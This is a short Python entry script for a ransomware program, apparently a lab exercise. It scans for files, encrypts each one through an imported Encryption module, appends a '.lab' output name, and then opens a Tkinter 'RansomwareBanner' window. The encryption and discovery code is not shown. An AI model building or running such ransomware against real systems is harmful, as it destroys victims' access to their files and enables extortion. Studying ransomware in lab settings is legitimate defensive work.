import os
import Encryption
import banner
import filediscovery
import tkinter as tk

# target_folder = "Important_Folder"

# def setup():
#     os.makedirs(target_folder, exist_ok=True)

if __name__ == "__main__":
    # setup()c

    print("[+] Scanning files...")

    # store paths in a variable
    discovered_paths = filediscovery.scan_files()

    print(f"[+] Found {len(discovered_paths)} files")

    print("[+] Encrypting files...")
    for path in discovered_paths:
        print(f"Encrypting: {path['path']}")
        output_file = os.path.join(path["path"] + ".lab")
        # print(output_file)
        Encryption.encrypt_file(path["path"])
        # Encryption.encrypt_folder(path['path'])

    # Running Banner Message
    print("[+] Launching banner...")
    root = tk.Tk()
    app = banner.RansomwareBanner(root)
    root.mainloop()
